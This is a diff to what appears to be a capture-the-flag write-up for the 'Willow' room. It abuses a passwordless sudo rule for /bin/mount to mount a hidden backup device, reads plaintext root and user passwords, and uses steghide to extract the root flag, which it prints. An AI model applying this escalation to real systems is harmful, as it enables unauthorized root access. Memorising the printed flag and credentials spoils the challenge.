@@ -162,3 +162,61 @@ User willow may run the following commands on willow-tree:
 ```
 ### 13. Privilege Escalation Path Analysis
 The willow user is authorized to execute /bin/mount /dev/* as root without a password. This allows mounting arbitrary block devices or loop devices with elevated options (or mounting root filesystems/crafted images containing SUID binaries), providing a direct path to full root compromise.
+
+---
+
+## Privilege Escalation via Device Mounting
+### 14. Device Enumeration
+Inspecting the ```/dev``` directory and searching specifically for block devices reveals a non-standard device named ```/dev/hidden_backup```:
+```bash
+find /dev -type b
+```
+Discovered Block Devices:
+```bash
+/dev/hidden_backup
+/dev/xvda3
+/dev/xvda2
+/dev/xvda1
+/dev/xvda
+/dev/xvdh
+```
+### 15. Mounting the Hidden Backup
+Exploiting the passwordless sudo entry for ```/bin/mount /dev/*```, create a temporary directory and mount ```/dev/hidden_backup```:
+```bash
+cd /home/willow
+mkdir finding
+sudo /bin/mount /dev/hidden_backup /home/willow/finding
+```
+### 16. Credentials Recovery
+Navigating to the mount directory reveals a ```creds.txt``` file containing plain credentials:
+```bash
+cd finding
+cat creds.txt
+```
+Recovered Credentials:
+```bash
+root:7qvbvBTvwPspUK
+willow:UOZZJLGYhNAT2s
+```
+- Root Password: ```7qvbvBTvwPspUK```
+
+---
+
+## Steganography & Root Flag Extraction
+### 17. Steghide Analysis on Image Artifact
+Using the recovered root password (```7qvbvBTvwPspUK```) as a passphrase, extract embedded hidden data from the reconstructed ```user.jpg``` file using steghide:
+```bash
+steghide extract -sf user.jpg
+```
+- Passphrase: 7qvbvBTvwPspUK
+- Extracted Artifact: root.txt
+
+### 18. Root Flag Retrieval
+Output the contents of ```root.txt``` to confirm total target compromise:
+```bash
+cat root.txt
+```
+Root Flag:
+```bash
+THM{find_a_red_rose_on_the_grave}
+```
